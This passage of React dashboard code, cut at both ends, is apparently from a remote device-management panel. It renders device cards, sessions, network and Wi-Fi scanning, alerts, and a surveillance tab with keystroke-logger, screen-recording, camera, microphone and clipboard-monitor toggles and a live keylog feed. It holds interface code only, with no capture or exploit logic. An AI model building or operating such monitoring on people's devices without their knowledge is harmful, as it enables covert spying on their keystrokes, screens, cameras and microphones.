                        <div className="text-[11px] font-bold capitalize mt-0.5 truncate" style={{ color:c }}>{v}</div>
                      </div>
                    ))}
                  </div>

                  {/* meta + Software A badge */}
                  <div className="flex items-center justify-between gap-2">
                    <div className="text-[10px] font-mono truncate" style={{ color:"#6b8ab0" }}>
                      {d.ip} · {d.location} · {d.lastSeen}
                    </div>
                    <span className="text-[9px] font-mono px-2 py-0.5 rounded-full flex-shrink-0"
                      style={{
                        background: (d.softwareA ?? "none")==="active" ? "rgba(16,217,160,0.15)" : "rgba(107,138,176,0.1)",
                        color:      (d.softwareA ?? "none")==="active" ? "#10d9a0"                : "#6b8ab0",
                        border:     `1px solid ${(d.softwareA ?? "none")==="active" ? "rgba(16,217,160,0.3)" : "rgba(107,138,176,0.2)"}`,
                      }}>
                      SW-A: {(d.softwareA ?? "none")==="active" ? "active" : (d.softwareA ?? "none")==="inactive" ? "inactive" : "—"}
                    </span>
                  </div>

                  {/* actions */}
                  <div className="flex gap-1.5 pt-2 border-t flex-wrap" style={{ borderColor:"rgba(59,130,246,0.15)" }}>
                    <button
                      onClick={() => d.status!=="offline" && d.status!=="suspended" && onControl(d)}
                      disabled={d.status==="offline" || d.status==="suspended"}
                      className="flex-1 flex items-center justify-center gap-1 py-1.5 rounded-xl text-xs font-bold transition-all hover:opacity-85 disabled:opacity-30 disabled:cursor-not-allowed"
                      style={{ background:"linear-gradient(135deg,#2563eb,#3b82f6)", color:"#fff" }}>
                      <Monitor size={11}/>Connect
                    </button>
                    <button onClick={() => openManage(d)} title="Manage"
                      className="p-1.5 rounded-xl transition-all hover:opacity-85"
                      style={{ background:"rgba(6,182,212,0.15)", color:"#10d9a0", border:"1px solid rgba(6,182,212,0.3)" }}>
                      <Settings size={12}/>
                    </button>
                    <button onClick={() => {
                        apiCall(`/devices/${d.id}/cmd`, "POST", { type:"SCREENSHOT" })
                          .then(() => show(`Screenshot requested from ${d.name}`, "info"))
                          .catch(() => show("Device not connected", "error"));
                      }} title="Screenshot"
                      className="p-1.5 rounded-xl transition-all hover:opacity-85"
                      style={{ background:"rgba(59,130,246,0.1)", color:"#3b82f6", border:"1px solid rgba(59,130,246,0.25)" }}>
                      <Camera size={12}/>
                    </button>
                    <button onClick={() => d.status!=="offline" && d.status!=="suspended" && onControl(d)} title="Remote Shell"
                      className="p-1.5 rounded-xl transition-all hover:opacity-85"
                      style={{ background:"rgba(16,185,129,0.1)", color:"#10b981", border:"1px solid rgba(16,185,129,0.25)" }}>
                      <Terminal size={12}/>
                    </button>
                    {d.status === "suspended" ? (
                      <button onClick={() => handleUnsuspendDev(d.id)} title="Reactivate"
                        className="p-1.5 rounded-xl transition-all hover:opacity-85"
                        style={{ background:"rgba(16,185,129,0.1)", color:"#10b981", border:"1px solid rgba(16,185,129,0.25)" }}>
                        <Power size={12}/>
                      </button>
                    ) : (
                      <button onClick={() => handleSuspendDev(d.id)} title="Suspend"
                        className="p-1.5 rounded-xl transition-all hover:opacity-85"
                        style={{ background:"rgba(245,158,11,0.1)", color:"#f59e0b", border:"1px solid rgba(245,158,11,0.25)" }}>
                        <Ban size={12}/>
                      </button>
                    )}
                    <button onClick={() => handleArchiveDev(d.id)} title="Archive / Delete"
                      className="p-1.5 rounded-xl transition-all hover:opacity-85"
                      style={{ background:"rgba(239,68,68,0.08)", color:"#ef4444", border:"1px solid rgba(239,68,68,0.2)" }}>
                      <X size={12}/>
                    </button>
                  </div>
                </div>
              );
            })}

            {/* enroll placeholder */}
            <button onClick={openAdd}
              className="p-5 rounded-2xl border-2 border-dashed flex flex-col items-center justify-center gap-3 min-h-[260px] transition-all hover:border-purple-500/60"
              style={{ borderColor:"rgba(59,130,246,0.28)", color:"#6b8ab0" }}>
              <div className="w-12 h-12 rounded-2xl flex items-center justify-center" style={{ background:"rgba(59,130,246,0.1)" }}>
                <Signal size={22} color="#3b82f6"/>
              </div>
              <span className="text-sm font-semibold" style={{ color:"#3b82f6" }}>Enroll New Device</span>
              <span className="text-xs text-center">Generate a code or connect by IP</span>
            </button>
          </div>
          )}

          {/* ── LIST VIEW ── */}
          {viewMode === "list" && (
          <div className="rounded-2xl border overflow-hidden" style={{ background:"#0a1628", borderColor:"rgba(59,130,246,0.2)" }}>
            {/* table header */}
            <div className="grid text-[10px] font-mono uppercase tracking-widest px-4 py-2.5 border-b"
              style={{ gridTemplateColumns:"2fr 1fr 1fr 1fr 1fr 1fr 1fr auto", color:"#6b8ab0", borderColor:"rgba(59,130,246,0.15)", background:"#0a0818" }}>
              <span>Device</span>
              <span>Location</span>
              <span>Status</span>
              <span>CPU</span>
              <span>RAM</span>
              <span>Ping</span>
              <span>Last Seen</span>
              <span>Actions</span>
            </div>

            {filtered.length === 0 && (
              <div className="py-12 text-center text-sm" style={{ color:"#6b8ab0" }}>
                No devices match current filters
              </div>
            )}

            {filtered.map((d, i) => {
              const sc = d.status==="online"?"#10b981":d.status==="warning"?"#f59e0b":d.status==="suspended"?"#a855f7":"#6b8ab0";
              return (
                <div key={d.id}
                  className="grid items-center px-4 py-3 border-b transition-colors hover:bg-white/[0.02]"
                  style={{ gridTemplateColumns:"2fr 1fr 1fr 1fr 1fr 1fr 1fr auto",
                           borderColor:"rgba(59,130,246,0.1)",
                           borderBottomWidth: i===filtered.length-1 ? 0 : 1 }}>

                  {/* Device name + OS */}
                  <div className="flex items-center gap-2.5 min-w-0">
                    <div className="w-8 h-8 rounded-lg flex items-center justify-center text-lg flex-shrink-0"
                      style={{ background:`${OS_COLOR[d.os]}18`, border:`1px solid ${OS_COLOR[d.os]}30` }}>
                      {OS_ICON[d.os]}
                    </div>
                    <div className="min-w-0">
                      <div className="text-sm font-bold truncate" style={{ color:"#e2eaf6" }}>{d.name}</div>
                      <div className="text-[10px] font-mono" style={{ color:"#6b8ab0" }}>{d.user} · {d.ip}</div>
                    </div>
                  </div>

                  {/* Location */}
                  <div className="text-xs font-mono truncate" style={{ color:"#a78bfa" }}>
                    🌍 {d.location}
                  </div>

                  {/* Status pill */}
                  <div>
                    <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-mono font-bold capitalize"
                      style={{ background:`${sc}18`, border:`1px solid ${sc}30`, color:sc }}>
                      <span className="w-1.5 h-1.5 rounded-full" style={{ background:sc }}/>
                      {d.status}
                    </span>
                  </div>

                  {/* CPU */}
                  <div className="text-xs font-mono font-bold"
                    style={{ color: d.status==="offline"?"#6b8ab0":d.cpu>80?"#ef4444":d.cpu>60?"#f59e0b":"#10b981" }}>
                    {d.status!=="offline" ? `${d.cpu}%` : "—"}
                  </div>

                  {/* RAM */}
                  <div className="text-xs font-mono font-bold"
                    style={{ color: d.status==="offline"?"#6b8ab0":d.ram>80?"#ef4444":"#3b82f6" }}>
                    {d.status!=="offline" ? `${d.ram}%` : "—"}
                  </div>

                  {/* Ping */}
                  <div className="text-xs font-mono font-bold"
                    style={{ color: d.latency===0?"#6b8ab0":d.latency>10?"#f59e0b":"#10d9a0" }}>
                    {d.latency>0 ? `${d.latency}ms` : "—"}
                  </div>

                  {/* Last seen */}
                  <div className="text-[11px] font-mono" style={{ color:"#6b8ab0" }}>{d.lastSeen}</div>

                  {/* Actions */}
                  <div className="flex items-center gap-1.5">
                    <button
                      onClick={() => d.status!=="offline" && onControl(d)}
                      disabled={d.status==="offline"}
                      title="Connect"
                      className="p-1.5 rounded-lg transition-all hover:opacity-80 disabled:opacity-30 disabled:cursor-not-allowed"
                      style={{ background:"rgba(59,130,246,0.2)", color:"#a78bfa" }}>
                      <Monitor size={12}/>
                    </button>
                    <button onClick={() => openManage(d)} title="Manage"
                      className="p-1.5 rounded-lg transition-all hover:opacity-80"
                      style={{ background:"rgba(6,182,212,0.15)", color:"#10d9a0" }}>
                      <Settings size={12}/>
                    </button>
                    <button onClick={() => {
                        apiCall(`/devices/${d.id}/cmd`, "POST", { type:"SCREENSHOT" })
                          .then(() => show(`Screenshot requested from ${d.name}`, "info"))
                          .catch(() => show("Device not connected", "error"));
                      }} title="Screenshot"
                      className="p-1.5 rounded-lg transition-all hover:opacity-80"
                      style={{ background:"rgba(16,185,129,0.1)", color:"#10b981" }}>
                      <Camera size={12}/>
                    </button>
                    <button onClick={() => d.status!=="offline" && d.status!=="suspended" && onControl(d)} title="Remote Shell"
                      className="p-1.5 rounded-lg transition-all hover:opacity-80"
                      style={{ background:"rgba(245,158,11,0.1)", color:"#f59e0b" }}>
                      <Terminal size={12}/>
                    </button>
                    {d.status === "suspended" ? (
                      <button onClick={() => handleUnsuspendDev(d.id)} title="Reactivate"
                        className="p-1.5 rounded-lg transition-all hover:opacity-80"
                        style={{ background:"rgba(16,185,129,0.1)", color:"#10b981" }}>
                        <Power size={12}/>
                      </button>
                    ) : (
                      <button onClick={() => handleSuspendDev(d.id)} title="Suspend"
                        className="p-1.5 rounded-lg transition-all hover:opacity-80"
                        style={{ background:"rgba(168,85,247,0.1)", color:"#a855f7" }}>
                        <Ban size={12}/>
                      </button>
                    )}
                    <button onClick={() => handleArchiveDev(d.id)} title="Archive"
                      className="p-1.5 rounded-lg transition-all hover:opacity-80"
                      style={{ background:"rgba(239,68,68,0.08)", color:"#ef4444" }}>
                      <X size={12}/>
                    </button>
                  </div>
                </div>
              );
            })}

            {/* List footer — enroll CTA */}
            <button onClick={openAdd}
              className="w-full flex items-center justify-center gap-2 py-3 text-xs font-semibold transition-colors hover:bg-white/[0.02]"
              style={{ color:"#3b82f6", borderTop:"1px solid rgba(59,130,246,0.1)" }}>
              <Signal size={12}/>Enroll New Device
            </button>
          </div>
          )}

          {/* ── Archive panel ── */}
          {showArchive && (
            <div className="rounded-2xl border p-5 space-y-3" style={{ background:"#0a1628", borderColor:"rgba(245,158,11,0.3)" }}>
              <div className="flex items-center justify-between">
                <div className="text-[10px] font-mono uppercase tracking-widest" style={{ color:"#f59e0b" }}>
                  📦 Archived Devices ({archivedDevices.length})
                </div>
                {archivedDevices.length > 0 && (
                  <button onClick={() => { setArchivedDevices([]); show("Archive cleared", "info"); }}
                    className="text-[11px] font-mono underline" style={{ color:"#6b8ab0" }}>Clear archive</button>
                )}
              </div>
              {archivedDevices.length === 0 ? (
                <div className="text-xs text-center py-6" style={{ color:"#6b8ab0" }}>No archived devices</div>
              ) : (
                <div className="space-y-2">
                  {archivedDevices.map(d => (
                    <div key={d.id} className="flex items-center gap-3 px-4 py-3 rounded-xl border" style={{ background:"#0d1930", borderColor:"rgba(245,158,11,0.15)" }}>
                      <div className="text-lg">{OS_ICON[d.os]}</div>
                      <div className="flex-1 min-w-0">
                        <div className="text-sm font-bold truncate" style={{ color:"#e2eaf6" }}>{d.name}</div>
                        <div className="text-[10px] font-mono" style={{ color:"#6b8ab0" }}>{d.user} · {d.ip} · Last: {d.lastSeen}</div>
                      </div>
                      <button onClick={() => handleRestoreArchived(d.id)}
                        className="px-3 py-1 rounded-lg text-xs font-mono transition-all hover:opacity-85"
                        style={{ background:"rgba(16,185,129,0.15)", color:"#10b981", border:"1px solid rgba(16,185,129,0.25)" }}>
                        Restore
                      </button>
                      <button onClick={() => { setArchivedDevices(p => p.filter(x => x.id!==d.id)); show("Device permanently deleted", "info"); }}
                        className="p-1.5 rounded-lg transition-all hover:opacity-85"
                        style={{ background:"rgba(239,68,68,0.1)", color:"#ef4444" }}>
                        <X size={12}/>
                      </button>
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}

          {/* Quick actions */}
          <div className="rounded-2xl border p-5" style={{ background:"#0a1628", borderColor:"rgba(59,130,246,0.2)" }}>
            <div className="text-[10px] font-mono uppercase tracking-widest mb-3" style={{ color:"#6b8ab0" }}>Quick Actions</div>
            <div className="flex flex-wrap gap-3">
              <ActionBtn onClick={handleOTA} color="#3b82f6" outline>
                <Upload size={13}/>
                {otaPct !== null ? `Pushing… ${otaPct}%` : "Push OTA Update to All"}
              </ActionBtn>
              <ActionBtn onClick={() => setShowQR(true)} color="#10d9a0" outline><Signal size={13}/>Generate Enroll QR</ActionBtn>
              <ActionBtn onClick={handleExportAudit} color="#10b981" outline><FileText size={13}/>Export Audit Log</ActionBtn>
              <ActionBtn onClick={handleHealthScan} color="#f59e0b" outline><Activity size={13}/>Run Health Scan</ActionBtn>
              <ActionBtn onClick={handleScreenshotAll} color="#a855f7" outline><Camera size={13}/>Screenshot All</ActionBtn>
              <ActionBtn onClick={handleRefresh} color="#6b8ab0" outline><RefreshCw size={13}/>Refresh</ActionBtn>
            </div>
          </div>
        </div>
      )}

      {/* ══ SESSIONS ══ */}
      {tab === "sessions" && (
        <div className="space-y-4">
          <div className="flex items-center justify-between flex-wrap gap-3">
            <div>
              <h2 className="font-black text-lg" style={{ color:"#e2eaf6" }}>Active Sessions</h2>
              <p className="text-xs mt-0.5" style={{ color:"#6b8ab0" }}>{activeSess} live · {sessions.length} total</p>
            </div>
            <ActionBtn onClick={() => { setSessions([]); show("All sessions terminated","info"); }} color="#ef4444" outline>
              <Square size={13}/>End All
            </ActionBtn>
          </div>
          <div className="rounded-2xl overflow-hidden border" style={{ background:"#0a1628", borderColor:"rgba(59,130,246,0.2)" }}>
            <table className="w-full text-sm min-w-[680px]">
              <thead>
                <tr style={{ borderBottom:"1px solid rgba(59,130,246,0.15)", background:"#0d1930" }}>
                  {["Device","User","OS","Status","Duration","Data","Ping","Actions"].map(h => (
                    <th key={h} className="text-left px-4 py-3 text-[10px] font-mono uppercase tracking-wider" style={{ color:"#6b8ab0" }}>{h}</th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {sessions.length === 0 && (
                  <tr><td colSpan={8} className="px-4 py-10 text-center text-sm" style={{ color:"#6b8ab0" }}>No active sessions</td></tr>
                )}
                {sessions.map(s => {
                  const sc = s.status==="active"?"#10b981":s.status==="paused"?"#f59e0b":"#6b8ab0";
                  return (
                    <tr key={s.id} className="transition-colors hover:bg-purple-500/5" style={{ borderBottom:"1px solid rgba(59,130,246,0.08)" }}>
                      <td className="px-4 py-3"><div className="flex items-center gap-2"><span>{OS_ICON[s.os]}</span><span className="font-semibold text-xs" style={{ color:"#e2eaf6" }}>{s.device}</span></div></td>
                      <td className="px-4 py-3 text-xs font-mono" style={{ color:"#b8cce8" }}>{s.user}</td>
                      <td className="px-4 py-3 text-xs" style={{ color:"#6b8ab0" }}>{OS_LABEL[s.os]}</td>
                      <td className="px-4 py-3"><span className="flex items-center gap-1 text-[10px] font-bold font-mono uppercase"><span className="w-1.5 h-1.5 rounded-full" style={{ background:sc }}/><span style={{ color:sc }}>{s.status}</span></span></td>
                      <td className="px-4 py-3 text-xs font-mono" style={{ color:"#b8cce8" }}>{s.duration}</td>
                      <td className="px-4 py-3 text-xs font-mono" style={{ color:"#b8cce8" }}>{s.data}</td>
                      <td className="px-4 py-3 text-xs font-mono" style={{ color:s.latency>10?"#f59e0b":"#10b981" }}>{s.latency}ms</td>
                      <td className="px-4 py-3">
                        <div className="flex items-center gap-1.5">
                          <button onClick={() => handleToggleSess(s.id)}
                            className="p-1.5 rounded-lg transition-all hover:opacity-80"
                            style={{ background:"rgba(59,130,246,0.15)", color:"#3b82f6" }}
                            title={s.status==="active"?"Pause":"Resume"}>
                            {s.status==="active" ? <Pause size={11}/> : <Play size={11}/>}
                          </button>
                          <button onClick={() => handleEndSession(s.id)}
                            className="p-1.5 rounded-lg transition-all hover:opacity-80"
                            style={{ background:"rgba(239,68,68,0.15)", color:"#ef4444" }} title="End">
                            <Square size={11}/>
                          </button>
                          <button onClick={() => show(`Screenshot from ${s.device}`,"info")}
                            className="p-1.5 rounded-lg transition-all hover:opacity-80"
                            style={{ background:"rgba(6,182,212,0.15)", color:"#10d9a0" }} title="Screenshot">
                            <Camera size={11}/>
                          </button>
                        </div>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* ══ NETWORK ══ */}
      {tab === "network" && (() => {
        const IFACE_META: Record<string, { icon: React.ReactNode; color: string; label: string }> = {
          ethernet:  { icon:<Server size={15}/>,    color:"#10d9a0", label:"Ethernet" },
          wifi:      { icon:<WifiIcon size={15}/>,  color:"#3b82f6", label:"Wi-Fi" },
          bluetooth: { icon:<Bluetooth size={15}/>, color:"#3b82f6", label:"Bluetooth" },
          lan:       { icon:<Network size={15}/>,   color:"#10b981", label:"LAN" },
          wan:       { icon:<Globe size={15}/>,     color:"#f59e0b", label:"WAN" },
          offline:   { icon:<XCircle size={15}/>,   color:"#6b8ab0", label:"Offline" },
        };
        const visIfaces = netFilter === "all" ? netIfaces : netIfaces.filter(n => n.type === netFilter);
        const ifaceCounts: Record<string, number> = {};
        netIfaces.forEach(n => { ifaceCounts[n.type] = (ifaceCounts[n.type] || 0) + 1; });
        return (
          <div className="space-y-5">
            {/* Header */}
            <div className="flex items-center justify-between flex-wrap gap-3">
              <div>
                <h2 className="font-black text-lg" style={{ color:"#e2eaf6" }}>Network Discovery</h2>
                <p className="text-xs mt-0.5" style={{ color:"#6b8ab0" }}>Multi-interface discovery · RF scanner · LAN/WAN topology · Bluetooth mesh</p>
              </div>
              <ActionBtn onClick={handleScan} disabled={scanning} color="#10d9a0">
                <WifiIcon size={13}/>{scanning ? `Scanning… ${scanPct}%` : "Scan All Interfaces"}
              </ActionBtn>
            </div>

            {/* Interface type filter */}
            <div className="flex flex-wrap gap-1.5">
              {(["all","ethernet","wifi","bluetooth","lan","wan","offline"] as const).map(f => {
                const meta = f === "all" ? null : IFACE_META[f];
                const cnt  = f === "all" ? netIfaces.length : (ifaceCounts[f] || 0);
                return (
                  <button key={f} onClick={() => setNetFilter(f as NetworkIface["type"]|"all")}
                    className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold transition-all"
                    style={{ background:netFilter===f ? (meta ? meta.color+"28" : "rgba(59,130,246,0.2)") : "#0d1930",
                             color:netFilter===f ? (meta ? meta.color : "#3b82f6") : "#6b8ab0",
                             border:`1px solid ${netFilter===f ? (meta ? meta.color+"60" : "rgba(59,130,246,0.4)") : "rgba(59,130,246,0.12)"}` }}>
                    {meta ? meta.icon : <Network size={13}/>}
                    {meta ? meta.label : "All"}
                    <span className="text-[10px] opacity-60">({cnt})</span>
                  </button>
                );
              })}
            </div>

            {/* Interface cards grid */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
              {visIfaces.map(iface => {
                const meta = IFACE_META[iface.type];
                const isOn = iface.status === "connected";
                const isScanning = iface.status === "scanning";
                return (
                  <div key={iface.id} className="p-4 rounded-xl border transition-all"
                    style={{ background:"#0a1628", borderColor:isOn ? `${meta.color}40` : isScanning ? "rgba(245,158,11,0.3)" : "rgba(59,130,246,0.15)" }}>
                    <div className="flex items-start justify-between gap-3">
                      <div className="flex items-center gap-3 min-w-0">
                        <div className="w-10 h-10 rounded-xl flex items-center justify-center flex-shrink-0"
                          style={{ background:`${meta.color}14`, border:`1px solid ${meta.color}30` }}>
                          {meta.icon}
                        </div>
                        <div className="min-w-0">
                          <div className="flex items-center gap-2 flex-wrap">
                            <span className="font-bold text-sm" style={{ color:"#e2eaf6" }}>{iface.label || iface.name}</span>
                            <Chip color={isOn ? meta.color : isScanning ? "#f59e0b" : "#6b8ab0"}>
                              {isScanning ? "scanning" : iface.status}
                            </Chip>
                          </div>
                          <div className="font-mono text-[10px] mt-0.5" style={{ color:"#6b8ab0" }}>{iface.name}</div>
                          <div className="flex flex-wrap gap-x-3 gap-y-0.5 mt-1 text-[11px] font-mono" style={{ color:"#5a536e" }}>
                            {iface.ip && <span style={{ color:"#b8cce8" }}>{iface.ip}</span>}
                            {iface.mac && <span>{iface.mac}</span>}
                            {iface.ssid && <span style={{ color:meta.color }}>{iface.ssid}</span>}
                            {iface.speed && <span>{iface.speed}</span>}
                            <span>{iface.devices} device{iface.devices !== 1 ? "s" : ""}</span>
                          </div>
                        </div>
                      </div>
                      {iface.signal !== undefined && (
                        <div className="flex-shrink-0" style={{ width:64 }}>
                          <MiniBar value={iface.signal} color={iface.signal>70?"#10b981":iface.signal>40?"#f59e0b":"#ef4444"}/>
                          <div className="text-[9px] font-mono text-center mt-1" style={{ color:"#6b8ab0" }}>{iface.signal}%</div>
                        </div>
                      )}
                    </div>
                    <div className="flex gap-2 mt-3">
                      <ActionBtn onClick={() => show(`Scanning ${iface.label || iface.name} for devices…`)} color={meta.color} outline>
                        <Search size={11}/>Discover
                      </ActionBtn>
                      {iface.type === "wifi" && (
                        <ActionBtn onClick={() => show(`Connecting to ${iface.ssid || iface.name}`)} color="#10d9a0" outline>
                          <Signal size={11}/>Connect
                        </ActionBtn>
                      )}
                      {iface.status === "disconnected" && (
                        <ActionBtn onClick={() => show(`Attempting to bring up ${iface.name}…`)} color="#10b981" outline>
                          <Power size={11}/>Bring Up
                        </ActionBtn>
                      )}
                    </div>
                  </div>
                );
              })}
            </div>

            {/* RF Scan progress */}
            {scanning && (
              <div className="rounded-xl p-4 border" style={{ background:"#0a1628", borderColor:"rgba(6,182,212,0.3)" }}>
                <div className="flex justify-between mb-2 text-xs font-mono" style={{ color:"#10d9a0" }}>
                  <span>Scanning 2.4 GHz + 5 GHz bands…</span><span>{scanPct}%</span>
                </div>
                <div className="h-2 rounded-full overflow-hidden" style={{ background:"rgba(6,182,212,0.15)" }}>
                  <div className="h-full rounded-full transition-all" style={{ width:`${scanPct}%`, background:"linear-gradient(90deg,#10d9a0,#3b82f6)" }}/>
                </div>
              </div>
            )}

            {/* WiFi network list */}
            <div className="space-y-3">
              <div className="text-[10px] font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>
                RF / Wi-Fi Networks {scanned && <span style={{ color:"#10b981" }}>· Scan complete — {wifi.length} found</span>}
              </div>
              {wifi.map(net => (
                <div key={net.ssid} className="p-4 rounded-xl border transition-all hover:border-purple-500/40"
                  style={{ background:"#0a1628", borderColor:net.threat?"rgba(239,68,68,0.4)":"rgba(59,130,246,0.2)" }}>
                  <div className="flex items-center justify-between gap-3 flex-wrap">
                    <div className="flex items-center gap-3 min-w-0">
                      <div className="w-10 h-10 rounded-xl flex items-center justify-center flex-shrink-0"
                        style={{ background:net.threat?"rgba(239,68,68,0.15)":"rgba(6,182,212,0.12)", border:`1px solid ${net.threat?"rgba(239,68,68,0.3)":"rgba(6,182,212,0.25)"}` }}>
                        <WifiIcon size={16} color={net.threat?"#ef4444":"#10d9a0"}/>
                      </div>
                      <div className="min-w-0">
                        <div className="flex items-center gap-2">
                          <span className="font-bold text-sm" style={{ color:"#e2eaf6" }}>{net.ssid}</span>
                          {net.threat && <Chip color="#ef4444">THREAT</Chip>}
                        </div>
                        <div className="flex gap-3 mt-0.5 text-[11px] font-mono flex-wrap" style={{ color:"#6b8ab0" }}>
                          <span>{net.band}</span><span>·</span><span>{net.security}</span>
                          <span>·</span><span>{net.devices} devices</span>
                          <span>·</span><span style={{ color:net.signal>70?"#10b981":net.signal>40?"#f59e0b":"#ef4444" }}>{net.signal}% signal</span>
                        </div>
                      </div>
                    </div>
                    <div className="flex items-center gap-3 flex-shrink-0">
                      <div style={{ width:80 }}><MiniBar value={net.signal} color={net.signal>70?"#10b981":net.signal>40?"#f59e0b":"#ef4444"}/></div>
                      {net.threat
                        ? <ActionBtn onClick={() => show(`Threat AP "${net.ssid}" blocked`,"info")} color="#ef4444" outline><AlertTriangle size={12}/>Block</ActionBtn>
                        : <ActionBtn onClick={() => show(`Connecting to "${net.ssid}" — discovering devices`)} color="#10d9a0" outline><Signal size={12}/>Connect</ActionBtn>
                      }
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        );
      })()}

      {/* Users tab has moved to Software B Admin Console */}
      {tab === "users" && (
        <div className="flex flex-col items-center justify-center py-24 gap-4" style={{ color:"#6b8ab0" }}>
          <div className="w-14 h-14 rounded-2xl flex items-center justify-center" style={{ background:"rgba(59,130,246,0.12)", border:"1px solid rgba(59,130,246,0.3)" }}>
            <User size={26} color="#3b82f6"/>
          </div>
          <div className="text-center">
            <p className="font-bold text-base" style={{ color:"#e2eaf6" }}>User Management has moved</p>
            <p className="text-sm mt-1">Open <strong style={{ color:"#10d9a0" }}>Software B → Admin Console → User Management</strong></p>
          </div>
        </div>
      )}

      {/* ══ ALERTS ══ */}
      {tab === "alerts" && (
        <div className="space-y-4">
          <div className="flex items-center justify-between flex-wrap gap-3">
            <div>
              <h2 className="font-black text-lg" style={{ color:"#e2eaf6" }}>Live Alerts</h2>
              <p className="text-xs mt-0.5" style={{ color:"#6b8ab0" }}>{activeAlerts.length} active · {activeAlerts.filter(a=>a.level==="critical").length} critical</p>
            </div>
            <ActionBtn onClick={dismissAll} color="#6b8ab0" outline><Check size={13}/>Dismiss All</ActionBtn>
          </div>
          {activeAlerts.length === 0
            ? <div className="text-center py-16 text-sm" style={{ color:"#6b8ab0" }}>All clear — no active alerts</div>
            : activeAlerts.map(a => (
                <div key={a.id} className="flex items-start gap-3 p-4 rounded-xl border"
                  style={{ background:"#0a1628", borderColor:`${ALERT_COLOR[a.level]}33` }}>
                  <GlowDot color={ALERT_COLOR[a.level]}/>
                  <div className="flex-1 min-w-0">
                    <Chip color={ALERT_COLOR[a.level]}>{a.level}</Chip>
                    <div className="text-sm mt-1" style={{ color:"#b8cce8" }}>{a.msg}</div>
                    <div className="text-[10px] mt-1 font-mono" style={{ color:"#6b8ab0" }}>{a.time}</div>
                  </div>
                  <button onClick={() => dismissAlert(a.id)}
                    className="p-1.5 rounded-lg flex-shrink-0 hover:opacity-80 transition-all"
                    style={{ background:"rgba(59,130,246,0.1)", color:"#6b8ab0" }}>
                    <X size={13}/>
                  </button>
                </div>
              ))
          }
        </div>
      )}


      {/* ══ SURVEILLANCE ══ */}
      {tab === "surveillance" && (
        <div className="space-y-6">
          {/* Feature toggles */}
          <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-3">
            {[
              { label:"Keystroke Logger",    active:klEnabled,   set:setKlEnabled,   color:"#3b82f6", icon:<Keyboard size={15}/> },
              { label:"Screen Recording",    active:srEnabled,   set:setSrEnabled,   color:"#ef4444", icon:<Monitor size={15}/> },
              { label:"Camera Capture",      active:camEnabled,  set:setCamEnabled,  color:"#10d9a0", icon:<Camera size={15}/> },
              { label:"Microphone",          active:micEnabled,  set:setMicEnabled,  color:"#10b981", icon:<Mic size={15}/> },
              { label:"Clipboard Monitor",   active:clipEnabled, set:setClipEnabled, color:"#f59e0b", icon:<Clipboard size={15}/> },
            ].map(({ label, active, set, color, icon }) => (
              <div key={label} className="p-4 rounded-xl border cursor-pointer transition-all" onClick={() => { set(!active); show(`${label} ${!active?"enabled":"disabled"}`); }}
                style={{ background: active?`${color}15`:"#0a1628", borderColor: active?color:"rgba(59,130,246,0.2)", boxShadow: active?`0 0 16px ${color}22`:"none" }}>
                <div className="flex items-center justify-between mb-2">
                  <span style={{ color: active?color:"#6b8ab0" }}>{icon}</span>
                  <div className="w-8 h-4 rounded-full relative" style={{ background: active?color:"#0f1e3a" }}>
                    <div className="absolute top-0.5 w-3 h-3 rounded-full transition-all" style={{ left: active?"17px":"2px", background:"#fff" }}/>
                  </div>
                </div>
                <div className="text-xs font-semibold" style={{ color: active?"#e2eaf6":"#6b8ab0" }}>{label}</div>
                <div className="text-[10px] font-mono mt-0.5" style={{ color: active?color:"#1a3060" }}>{active?"ACTIVE":"INACTIVE"}</div>
              </div>
            ))}
          </div>

          {/* Keylogger feed */}
          <div className="rounded-2xl overflow-hidden border" style={{ background:"#0a1628", borderColor:"rgba(59,130,246,0.2)" }}>
            <div className="px-5 py-3 flex items-center justify-between border-b" style={{ borderColor:"rgba(59,130,246,0.15)", background:"#0d1930" }}>
              <div className="flex items-center gap-2 font-bold text-sm" style={{ color:"#e2eaf6" }}>
                <Keyboard size={14} color="#3b82f6"/> Keystroke Capture — Live Feed
              </div>
              <div className="flex gap-2">
                <ActionBtn onClick={() => show("Keylog exported (keylog_2026-07-01.txt)","info")} color="#3b82f6" outline><Download size={11}/>Export</ActionBtn>
                <ActionBtn onClick={() => show("Keylog cleared","info")} color="#ef4444" outline><X size={11}/>Clear</ActionBtn>
              </div>
            </div>
            <div className="divide-y" style={{ borderColor:"rgba(59,130,246,0.08)" }}>
              {klLogs.map((l,i) => (
                <div key={i} className="flex items-center gap-4 px-5 py-2.5 hover:bg-purple-500/5 transition-colors">
                  <span className="text-[10px] font-mono flex-shrink-0" style={{ color:"#6b8ab0" }}>{l.ts}</span>
                  <Chip color={OS_COLOR[SEED_DEVICES.find(d=>d.name===l.dev)?.os??"windows"]}>{l.dev}</Chip>
                  <span className="text-[10px] font-mono flex-shrink-0" style={{ color:"#10d9a0" }}>{l.app}</span>
                  <span className="text-xs flex-1 font-mono" style={{ color:"#b8cce8" }}>{l.text}</span>
                </div>
              ))}
            </div>
          </div>

          {/* Screen recordings + Clipboard side by side */}
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-5">
            {/* Recordings */}
            <div className="rounded-2xl overflow-hidden border" style={{ background:"#0a1628", borderColor:"rgba(239,68,68,0.3)" }}>
              <div className="px-5 py-3 flex items-center justify-between border-b" style={{ borderColor:"rgba(239,68,68,0.15)", background:"#0d1930" }}>
                <div className="flex items-center gap-2 font-bold text-sm" style={{ color:"#e2eaf6" }}><Monitor size={14} color="#ef4444"/> Screen Recordings</div>
                <ActionBtn onClick={() => show("Recording started on all online devices")} color="#ef4444" outline><Circle size={11}/>Record All</ActionBtn>
              </div>
              <div className="divide-y" style={{ borderColor:"rgba(59,130,246,0.08)" }}>
                {recordings.map(r => (
                  <div key={r.id} className="flex items-center gap-3 px-5 py-3">
                    <div className="flex-1 min-w-0">
                      <div className="text-xs font-semibold truncate" style={{ color:"#e2eaf6" }}>{r.dev}</div>
